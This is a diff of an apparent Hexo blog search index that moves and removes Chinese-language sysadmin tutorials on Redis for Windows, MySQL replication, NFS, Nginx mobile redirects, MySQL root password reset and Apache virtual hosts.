@@ -97,61 +97,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows上安装Redis</title>
-    <url>/2017/11/16/11.html</url>
-    <content><![CDATA[<p>对于Windows相信大家都有着一种怀旧感，所以对于刚进入编程世界的新手来说，用Windows编程编程自然而然的事了。下面笔者就来介绍一下如何在Windows上安装Redis。</p>
-<a id="more"></a>
-<ol>
-<li><p>下载Windows版的 <a href="https://github.com/MicrosoftArchive/redis/releases" target="_blank" rel="noopener">Redis</a></p>
-</li>
-<li><p>解压zip压缩文件之后，使用Windows的命令提示符切换到相应的目录<br> <strong>cmd命令简介：</strong></p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">abcd</span>&gt;<span class="title">d</span>:(进入<span class="title">D</span>盘)</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">cd</span> <span class="title">phpStudy</span>\<span class="title">Redis</span>(进入<span class="title">Redis</span>目录，具体目录根据解压<span class="title">Redis</span>后放置的目录而定)</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>启动Redis服务</p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server redis.windows.conf</span><br></pre></td></tr></table></figure>
-
-<p> <strong>如果报错：</strong></p>
-<blockquote>
-<p>QForkMasterInit: system error caught. error code=0x000005af, message=VirtualAllocEx failed.: unknown error 。原因是内存不够。</p>
-</blockquote>
-<p> <strong>解决方法：</strong><br> ① 启动时使用 <code>--maxmemory</code> 命令限制Redis的内存</p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server redis.windows.conf --maxmemory <span class="number">200</span>m</span><br></pre></td></tr></table></figure>
-
-<p> ② 修改配置文件 <code>redis.windows.conf</code></p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">maxmemory <span class="number">1073741824</span> [单位：字节(b)]</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>部署Redis，把Redis安装成Windows服务，开机自启动</p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-install redis.windows.conf</span><br></pre></td></tr></table></figure>
-
-<p> 安装完成之后，就可以看到Redis已经作为Windows服务了</p>
-<blockquote>
-<p>[2852] 04 Jul 12:11:52.898 # Redis successfully installed as a service。（大约这个意思就说明成功了）</p>
-</blockquote>
-<p> 但安装好之后，Redis并没有启动，启动命令</p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-<span class="built_in">start</span></span><br></pre></td></tr></table></figure>
-
-<p> 停止命令</p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-stop</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>安装多个实例</p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.redis-server --service-install -service-name redisService1 -port <span class="number">10001</span></span><br><span class="line"><span class="number">2</span>.redis-server --service-<span class="built_in">start</span> -service-name redisService1</span><br><span class="line"><span class="number">3</span>.redis-server --service-install -service-name redisService2 -port <span class="number">10002</span></span><br><span class="line"><span class="number">4</span>.redis-server --service-<span class="built_in">start</span> -service-name redisService2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>卸载命令</p>
- <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server -service-uninstall</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<hr>
-<p>参考文章：<a href="https://www.cnblogs.com/smileyearn/articles/4749746.html" target="_blank" rel="noopener">https://www.cnblogs.com/smileyearn/articles/4749746.html</a></p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Redis</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Sublime自定义快捷键（绑定插件）</title>
     <url>/2017/12/07/13.html</url>
     <content><![CDATA[<p>大家在使用Sublime的时候，是不是对于打印一些数据流的函数既爱又恨。爱的是这个东西对于排错和修改BUG是真的很有用，恨的是这个东西每次打起来是又多又长。那今天小编就介绍一种插件和快捷键结合的方法，快速输出打印函数。</p>
@@ -208,6 +153,61 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows上安装Redis</title>
+    <url>/2017/11/16/11.html</url>
+    <content><![CDATA[<p>对于Windows相信大家都有着一种怀旧感，所以对于刚进入编程世界的新手来说，用Windows编程编程自然而然的事了。下面笔者就来介绍一下如何在Windows上安装Redis。</p>
+<a id="more"></a>
+<ol>
+<li><p>下载Windows版的 <a href="https://github.com/MicrosoftArchive/redis/releases" target="_blank" rel="noopener">Redis</a></p>
+</li>
+<li><p>解压zip压缩文件之后，使用Windows的命令提示符切换到相应的目录<br> <strong>cmd命令简介：</strong></p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">abcd</span>&gt;<span class="title">d</span>:(进入<span class="title">D</span>盘)</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">cd</span> <span class="title">phpStudy</span>\<span class="title">Redis</span>(进入<span class="title">Redis</span>目录，具体目录根据解压<span class="title">Redis</span>后放置的目录而定)</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启动Redis服务</p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server redis.windows.conf</span><br></pre></td></tr></table></figure>
+
+<p> <strong>如果报错：</strong></p>
+<blockquote>
+<p>QForkMasterInit: system error caught. error code=0x000005af, message=VirtualAllocEx failed.: unknown error 。原因是内存不够。</p>
+</blockquote>
+<p> <strong>解决方法：</strong><br> ① 启动时使用 <code>--maxmemory</code> 命令限制Redis的内存</p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server redis.windows.conf --maxmemory <span class="number">200</span>m</span><br></pre></td></tr></table></figure>
+
+<p> ② 修改配置文件 <code>redis.windows.conf</code></p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">maxmemory <span class="number">1073741824</span> [单位：字节(b)]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>部署Redis，把Redis安装成Windows服务，开机自启动</p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-install redis.windows.conf</span><br></pre></td></tr></table></figure>
+
+<p> 安装完成之后，就可以看到Redis已经作为Windows服务了</p>
+<blockquote>
+<p>[2852] 04 Jul 12:11:52.898 # Redis successfully installed as a service。（大约这个意思就说明成功了）</p>
+</blockquote>
+<p> 但安装好之后，Redis并没有启动，启动命令</p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-<span class="built_in">start</span></span><br></pre></td></tr></table></figure>
+
+<p> 停止命令</p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-stop</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装多个实例</p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.redis-server --service-install -service-name redisService1 -port <span class="number">10001</span></span><br><span class="line"><span class="number">2</span>.redis-server --service-<span class="built_in">start</span> -service-name redisService1</span><br><span class="line"><span class="number">3</span>.redis-server --service-install -service-name redisService2 -port <span class="number">10002</span></span><br><span class="line"><span class="number">4</span>.redis-server --service-<span class="built_in">start</span> -service-name redisService2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>卸载命令</p>
+ <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server -service-uninstall</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<hr>
+<p>参考文章：<a href="https://www.cnblogs.com/smileyearn/articles/4749746.html" target="_blank" rel="noopener">https://www.cnblogs.com/smileyearn/articles/4749746.html</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Redis</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SVN服务器搭建（简篇）</title>
     <url>/2017/12/05/12.html</url>
     <content><![CDATA[<p>Subversion是一个自由开源的版本控制系统，相对于RCS、CVS，采用了分支管理系统。SVN实现多个人共同开发同一个项目，共用资源的目的。</p>
@@ -257,28 +257,18 @@
       </tags>
   </entry>
   <entry>
-    <title>多机部署之NFS的安装与配置</title>
-    <url>/2018/01/01/16.html</url>
-    <content><![CDATA[<p>NFS即网络文件系统，说的通俗一点就是网络共享文件。它能够让不同的服务器共享同一个资源，这个在集群部署中普遍运用。</p>
+    <title>多机部署之MySQL主从配置</title>
+    <url>/2018/01/01/17.html</url>
+    <content><![CDATA[<p>MySQL的主从配置可以让我们很好地减轻数据库的压力而完成更多的业务需求，下面笔者就来介绍一下简单的MySQL主从配置。</p>
 <a id="more"></a>
 <ol>
-<li><p>安装nfs</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y nfs-utils</span><br><span class="line">yum install -y rpcbind #适用centos 6</span><br><span class="line">yum install -y portmap #适用centos 5</span><br></pre></td></tr></table></figure></li>
-<li><p>启动NFS服务，一定要先启动rpcbind，后启动nfs</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/rpcbind start</span><br><span class="line">/etc/init.d/nfs start</span><br></pre></td></tr></table></figure></li>
-<li><p>在资源服务器（服务器端）上配置NFS，修改 <code>/etc/exports</code></p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/data/httpd/www/public 客户端ip（rw,sync,no_root_squash）</span><br><span class="line">/data/httpd/www/themes 客户端ip（rw,sync,no_root_squash）</span><br><span class="line">/data/httpd/www/wap_themes 客户端ip（rw,sync,no_root_squash）</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">修改好之后执行命令</span></span><br><span class="line">exportfs -rv</span><br></pre></td></tr></table></figure>
-
-<p> 查看是否成功</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">showmount -e 服务器端ip</span><br><span class="line">Export list for 服务器端ip</span><br><span class="line">/data/httpd/www/public 客户端ip</span><br><span class="line">/data/httpd/www/themes 客户端ip</span><br><span class="line">/data/httpd/www/wap_themes 客户端ip</span><br></pre></td></tr></table></figure></li>
-<li><p>web服务器（客户端）挂载资源服务器的资源</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount 服务器端ip:/data/httpd/www/public /data/httpd/www/public</span><br><span class="line">mount 服务器端ip:/data/httpd/www/themes /data/httpd/www/themes</span><br><span class="line">mount 服务器端ip:/data/httpd/www/wap_themes /data/httpd/www/wap_themes</span><br></pre></td></tr></table></figure></li>
-<li><p>防止重启服务器忘记挂载</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/rc.local</span><br><span class="line">mount 服务器端ip:/data/httpd/www/public /data/httpd/www/public</span><br><span class="line">mount 服务器端ip:/data/httpd/www/themes /data/httpd/www/themes</span><br><span class="line">mount 服务器端ip:/data/httpd/www/wap_themes /data/httpd/www/wap_themes</span><br></pre></td></tr></table></figure></li>
-<li><p>重启服务</p>
-<blockquote>
-<p>先启动：service rpcbind start 再启动：service nfs start<br>先关闭：service nfs stop 再关闭：service rpcbind stop</p>
-</blockquote>
+<li>主（从）服务器配置，修改配置文件 <code>/etc/my.cnf</code> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin #[必须]启用二进制日志</span><br><span class="line">server-id=110     #[必须]服务器唯一ID，默认是1，一般取IP最后一段</span><br></pre></td></tr></table></figure></li>
+<li>重启数据库 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysqld restart</span><br></pre></td></tr></table></figure></li>
+<li>登陆主服务器，给从服务器授权 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; GRANT REPLICATION SLAVE ON *.* TO '用户名'@'从服务器IP' identified by '密码';</span><br><span class="line"><span class="meta">#</span><span class="bash">查看是否添加成功</span></span><br><span class="line">mysql &gt; SELECT user,host,password FROM mysql.user;</span><br></pre></td></tr></table></figure></li>
+<li>查看主数据库状态 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; show master status;</span><br><span class="line"></span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">| mysql-bin.000001 | 640 | | | |</span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">这里需要记录File以及Position的值，在操作从服务器时会用到</span></span><br></pre></td></tr></table></figure></li>
+<li>登陆从数据库 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">执行sql</span></span><br><span class="line">mysql &gt; change master to master_host='主数据库ip',master_user='数据库登陆用户名',master_password='数据库登陆密码',master_log_file='mysql-bin.000001',master_log_pos=640;</span><br><span class="line"><span class="meta">#</span><span class="bash">启动同步进程</span></span><br><span class="line">mysql &gt; start slave;</span><br><span class="line"><span class="meta">#</span><span class="bash">主从同步检查</span></span><br><span class="line">mysql &gt; show slave status\G</span><br><span class="line"><span class="meta">#</span><span class="bash">可以看到：Slave_IO_Running | Slave_SQL_Running两个值都是YES，说明配置成功了</span></span><br></pre></td></tr></table></figure></li>
+<li>主从服务器测试 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">主服务器MySQL，建立数据库，并在这个库中建表插入一条数据</span></span><br><span class="line"><span class="meta">#</span><span class="bash">从服务器查看是否拥有此数据</span></span><br></pre></td></tr></table></figure></li>
+<li>MySQL主服务器给web服务器授权访问 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; GRANT ALL PRIVILEGES  ON 数据库名.* to '用户名'@'web服务器ip' identified by '密码';</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 ]]></content>
@@ -287,7 +277,7 @@
       </categories>
       <tags>
         <tag>多机部署</tag>
-        <tag>NFS</tag>
+        <tag>MySQL主从配置</tag>
       </tags>
   </entry>
   <entry>
@@ -337,30 +327,6 @@
         <tag>多机部署</tag>
         <tag>rsync+inotify</tag>
         <tag>双向实时同步代码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>多机部署之MySQL主从配置</title>
-    <url>/2018/01/01/17.html</url>
-    <content><![CDATA[<p>MySQL的主从配置可以让我们很好地减轻数据库的压力而完成更多的业务需求，下面笔者就来介绍一下简单的MySQL主从配置。</p>
-<a id="more"></a>
-<ol>
-<li>主（从）服务器配置，修改配置文件 <code>/etc/my.cnf</code> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin #[必须]启用二进制日志</span><br><span class="line">server-id=110     #[必须]服务器唯一ID，默认是1，一般取IP最后一段</span><br></pre></td></tr></table></figure></li>
-<li>重启数据库 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysqld restart</span><br></pre></td></tr></table></figure></li>
-<li>登陆主服务器，给从服务器授权 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; GRANT REPLICATION SLAVE ON *.* TO '用户名'@'从服务器IP' identified by '密码';</span><br><span class="line"><span class="meta">#</span><span class="bash">查看是否添加成功</span></span><br><span class="line">mysql &gt; SELECT user,host,password FROM mysql.user;</span><br></pre></td></tr></table></figure></li>
-<li>查看主数据库状态 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; show master status;</span><br><span class="line"></span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">| mysql-bin.000001 | 640 | | | |</span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">这里需要记录File以及Position的值，在操作从服务器时会用到</span></span><br></pre></td></tr></table></figure></li>
-<li>登陆从数据库 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">执行sql</span></span><br><span class="line">mysql &gt; change master to master_host='主数据库ip',master_user='数据库登陆用户名',master_password='数据库登陆密码',master_log_file='mysql-bin.000001',master_log_pos=640;</span><br><span class="line"><span class="meta">#</span><span class="bash">启动同步进程</span></span><br><span class="line">mysql &gt; start slave;</span><br><span class="line"><span class="meta">#</span><span class="bash">主从同步检查</span></span><br><span class="line">mysql &gt; show slave status\G</span><br><span class="line"><span class="meta">#</span><span class="bash">可以看到：Slave_IO_Running | Slave_SQL_Running两个值都是YES，说明配置成功了</span></span><br></pre></td></tr></table></figure></li>
-<li>主从服务器测试 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">主服务器MySQL，建立数据库，并在这个库中建表插入一条数据</span></span><br><span class="line"><span class="meta">#</span><span class="bash">从服务器查看是否拥有此数据</span></span><br></pre></td></tr></table></figure></li>
-<li>MySQL主服务器给web服务器授权访问 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; GRANT ALL PRIVILEGES  ON 数据库名.* to '用户名'@'web服务器ip' identified by '密码';</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>多机部署</tag>
-        <tag>MySQL主从配置</tag>
       </tags>
   </entry>
   <entry>
@@ -424,69 +390,37 @@
       </tags>
   </entry>
   <entry>
-    <title>Nginx配置--区分PC和WAP访问不同域名</title>
-    <url>/2018/01/13/18.html</url>
-    <content><![CDATA[<p>考虑到网站在多种设备下的兼容性，有很多网站会有手机版和电脑版两个版本。访问同一个网站URL，当服务器识别出用户使用电脑访问，就打开电脑版的页面，如果使用手机访问，就会得到手机版的页面。</p>
+    <title>多机部署之NFS的安装与配置</title>
+    <url>/2018/01/01/16.html</url>
+    <content><![CDATA[<p>NFS即网络文件系统，说的通俗一点就是网络共享文件。它能够让不同的服务器共享同一个资源，这个在集群部署中普遍运用。</p>
 <a id="more"></a>
-<p>要想让网站适配PC和WAP，首先要能做出准确的判断。HTTP请求的Header中的User-Agent可以区分客户端的浏览器类型，可以通过User-Agen来判断客户端的设备。<br><strong>下面举一个PC链接在WAP访问的例子：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    if ( $http_user_agent ~ "(MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT-)|(SonyEricsson)|(NEC-)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi-)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG-)|(LG/)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC-)|(SED-)|(EMOL-)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera)" ) &#123;</span><br><span class="line">        rewrite ^/(.*)$ http://m.nsxsg.com/wap/$1 last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!-e $request_filename) &#123;</span><br><span class="line">        rewrite  ^/(.*)$  /index.php/$1  last;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>安装nfs</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y nfs-utils</span><br><span class="line">yum install -y rpcbind #适用centos 6</span><br><span class="line">yum install -y portmap #适用centos 5</span><br></pre></td></tr></table></figure></li>
+<li><p>启动NFS服务，一定要先启动rpcbind，后启动nfs</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/rpcbind start</span><br><span class="line">/etc/init.d/nfs start</span><br></pre></td></tr></table></figure></li>
+<li><p>在资源服务器（服务器端）上配置NFS，修改 <code>/etc/exports</code></p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/data/httpd/www/public 客户端ip（rw,sync,no_root_squash）</span><br><span class="line">/data/httpd/www/themes 客户端ip（rw,sync,no_root_squash）</span><br><span class="line">/data/httpd/www/wap_themes 客户端ip（rw,sync,no_root_squash）</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">修改好之后执行命令</span></span><br><span class="line">exportfs -rv</span><br></pre></td></tr></table></figure>
 
-<p><strong>接下来解释一下其中的几个关键点：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;&#125; #匹配所有的请求</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent ~ “(一堆WAP匹配)” <span class="comment">#判断是wap</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent !~ “(一堆WAP匹配)” <span class="comment">#判断不是wap</span></span></span><br><span class="line"></span><br><span class="line">rewrite regex replacement [flag] #rewrite重写，regex正则，replacement替换的内容，flag标志位（详情自行百度这里用last就可以了）</span><br></pre></td></tr></table></figure>
-
-<p>上述内容用一句话概括：</p>
+<p> 查看是否成功</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">showmount -e 服务器端ip</span><br><span class="line">Export list for 服务器端ip</span><br><span class="line">/data/httpd/www/public 客户端ip</span><br><span class="line">/data/httpd/www/themes 客户端ip</span><br><span class="line">/data/httpd/www/wap_themes 客户端ip</span><br></pre></td></tr></table></figure></li>
+<li><p>web服务器（客户端）挂载资源服务器的资源</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount 服务器端ip:/data/httpd/www/public /data/httpd/www/public</span><br><span class="line">mount 服务器端ip:/data/httpd/www/themes /data/httpd/www/themes</span><br><span class="line">mount 服务器端ip:/data/httpd/www/wap_themes /data/httpd/www/wap_themes</span><br></pre></td></tr></table></figure></li>
+<li><p>防止重启服务器忘记挂载</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/rc.local</span><br><span class="line">mount 服务器端ip:/data/httpd/www/public /data/httpd/www/public</span><br><span class="line">mount 服务器端ip:/data/httpd/www/themes /data/httpd/www/themes</span><br><span class="line">mount 服务器端ip:/data/httpd/www/wap_themes /data/httpd/www/wap_themes</span><br></pre></td></tr></table></figure></li>
+<li><p>重启服务</p>
 <blockquote>
-<p>匹配所有请求，如果客户端是wap，重写域名斜杠后面的所有内容为<a href="http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）" target="_blank" rel="noopener">http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）</a></p>
+<p>先启动：service rpcbind start 再启动：service nfs start<br>先关闭：service nfs stop 再关闭：service rpcbind stop</p>
 </blockquote>
-<p>WAP链接在PC访问的具体配置自行修改。</p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>NGINX</tag>
-        <tag>配置文件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>修改MySql数据库密码</title>
-    <url>/2017/09/17/2.html</url>
-    <content><![CDATA[<p>笔者记性不太好，所以忘记密码是常有的事情。这不连数据库的密码也忘了。下面就来介绍一下如何暴力地修改数据库密码。</p>
-<a id="more"></a>
-<ol>
-<li>修改MySql的登录设置，保存退出</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash">在[mysqld]的内容段中加入一句</span></span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>重新启动数据库</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>登录并修改MySQL数据库的密码</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot</span><br><span class="line">mysql &gt;use mysql;</span><br><span class="line">mysql &gt;update user set Password = password ('123456') where User = 'root';</span><br><span class="line">mysql &gt;exit;</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>还原MySql的登录设置</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line">[注释掉原先新增的配置项] skip-grant-tables</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>重启MySQL并用新密码登录</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br><span class="line">mysql -uroot -p123456</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>参考文章：<a href="https://www.cnblogs.com/52php/p/5675258.html" target="_blank" rel="noopener">https://www.cnblogs.com/52php/p/5675258.html</a></p>
-]]></content>
-      <categories>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>数据库</tag>
-        <tag>修改密码</tag>
+        <tag>多机部署</tag>
+        <tag>NFS</tag>
       </tags>
   </entry>
   <entry>
@@ -518,53 +452,6 @@
       </categories>
       <tags>
         <tag>数据库备份</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu系统下配置Apache虚拟主机</title>
-    <url>/2018/05/24/21.html</url>
-    <content><![CDATA[<p>Ubuntu系统下安装了Apache服务，想要通过IP、域名、端口访问多个Web应用。</p>
-<a id="more"></a>
-<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
-<p>此教程适合apt-get install apache2安装的apache</p>
-</blockquote>
-<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ol>
-<li><p>进入配置文件目录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apache2/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置文件说明</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apache2.conf  #apache总的配置文件</span><br><span class="line">ports.conf    #端口配置文件</span><br><span class="line">sites-enables/000-default.conf    #虚拟主机配置文件</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h2 id="配置多个虚拟主机"><a href="#配置多个虚拟主机" class="headerlink" title="配置多个虚拟主机"></a>配置多个虚拟主机</h2><ol>
-<li><p>使用不同的端口访问网站的不同目录</p>
-<ul>
-<li>新增目录 <code>/var/www/html1</code> ,新增文件<code>/var/www/html1/index.php</code>（index.php文件内容自定）</li>
-<li>修改 <code>ports.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Listen 8006</span><br></pre></td></tr></table></figure>
-效果如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdDN0MnhqMzBuNzA4cmpydi5qcGc?x-oss-process=image/format,png" alt=""></li>
-<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:8006&gt;</span><br><span class="line">        ServerName 192.168.0.109</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error80.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access80.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
-内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxcnYycnZqMzBydTBqZDQwcy5qcGc?x-oss-process=image/format,png" alt=""></li>
-<li>重启apache2<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li>
-<li>访问 ( IP:8006 ) , 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdGhrcXFqMzBmMzA3Ymdsbi5qcGc?x-oss-process=image/format,png" alt=""></li>
-</ul>
-</li>
-<li><p>使用域名访问网站的不同目录</p>
-<ul>
-<li>修改本地host文件, 自定义一个域名, 指向服务器<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdHRqZ3NqMzBjdzA2N3dlaC5qcGc?x-oss-process=image/format,png" alt=""></li>
